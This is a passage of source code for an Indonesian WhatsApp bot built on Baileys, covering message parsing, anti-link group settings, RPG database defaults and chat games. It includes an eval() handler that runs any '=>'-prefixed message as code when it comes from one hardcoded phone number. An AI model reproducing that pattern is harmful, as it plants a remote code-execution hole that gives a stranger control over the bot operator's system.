require('./settings')
require('./lib/listmenu')
const {
	downloadContentFromMessage,
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	InteractiveMessage,
	getContentType
} = require('@whiskeysockets/baileys');
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker,path,PDFDocument } = modul
const { exec, spawn, execSync } = child_process
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const uploadImage = require('./lib/uploadImage2');
const { TelegraPh,UguuSe } = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const anon = require('./lib/menfess')
const {gpt4o,gemini,gpt4omini,gpt4,claude,arisuai,aris,Llama3,wizardlm,gemma } = require('./lib/ai')
const yts = require('./scrape/yt-search')
const { uploadToCatbox,uploadToTop4Top } = require('./scrape/tourl')
const { wallpapers,downloadVideo, saveVideo } = require('./scrape/wallpaperAnim')
const { searchManga,detailManga,dlManga } = require('./scrape/Manga')
const { searchNovel,getChNovel,dlNovel } = require('./scrape/Novel')
const { getStickers,dlStickers } = require('./scrape/stickerAnime')
const { OtakuSearch,OtakuDetail,OtakuDl } = require('./scrape/Anime')
const {pinSearch,pinGet,convertGifToVideo } = require('./scrape/pin')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const TanVoiceNote = JSON.parse(fs.readFileSync('./database/vn.json'))
const TanSticker = JSON.parse(fs.readFileSync('./database/sticker.json'))
const ImageTan = JSON.parse(fs.readFileSync('./database/img.json'))
const VideoTan = JSON.parse(fs.readFileSync('./database/video.json'))
const BadTan = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatTan = JSON.parse(fs.readFileSync('./database/chatShizuka.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let autoAiData = JSON.parse(fs.readFileSync('./database/respon.json', 'utf-8'));
const saveAutoAiData = () => {
    fs.writeFileSync('./database/respon.json', JSON.stringify(autoAiData, null, 2));
};
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = Tan = async (Tan, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

const budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
 const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'

async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: Tan.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Tan.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Tan.ev.emit('messages.upsert', msg)
}
         
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Tan.decodeJid(Tan.user.id)
        const isTanOwner = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const text = q = args.join(" ")
        const welcm = m.isGroup ? wlcm.includes(from) : true
const welcmm = m.isGroup ? wlcmm.includes(from) : true
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Tan.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = dansyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
   const isAutoAi = m.isGroup ? openaigc.includes(m.chat) : true;
      const isTanchat = m.isGroup ? chatTan.includes(m.chat) : true
      const shouldExit = true
      const automati = false
       
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : true
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isSimi = siminya.includes(m.chat) ? true : false 
const fiturTan = () =>{
            var mytext = fs.readFileSync("./gos").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var Tanwaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var Tanwaktu = `Selamat Malam `
 }
 if(time2 < "18:00:00"){
var Tanwaktu = `Selamat Malam `
 }
 if(time2 < "15:00:00"){
var Tanwaktu = `Selamat Sore `
 }
 if(time2 < "11:00:00"){
var Tanwaktu = `Selamat pagi `
 }
 if(time2 < "05:00:00"){
var Tanwaktu = `Selamat Pagi `
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+6281328139682") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await Tan.sendMessage(from, { text: evaled }, { quoted: fcall })
			} catch (e) {
				Tan.sendMessage(from, { text: String(e) }, { quoted: fcall })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

/* INI ADALAH DATABASE AKUN RPG, KLO MAU UBAH DISINI*/
}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}

const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = true
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = true
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: true,
    		status: 0,
    		stock:10,
    		autobio: true,
    		auto_ai_grup: true,
    		goodbye: true,
    		onlygrub: false,
        welcome: true, 
    		autoread: true
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !isTanOwner) return
}


if (!Tan.public) {
if (!m.key.fromMe) return
}

// auto message

//=========================================\\
//=========================================\\
//chat counter (console log)
  
        if (m.message && m.isGroup) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

Tan.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await Tan.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await Tan.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    Tan.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Tan.sendText(m.chat, `Jas telah dikirim ke obrolan

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing-masing"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Tan.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) Tan.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Tan.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
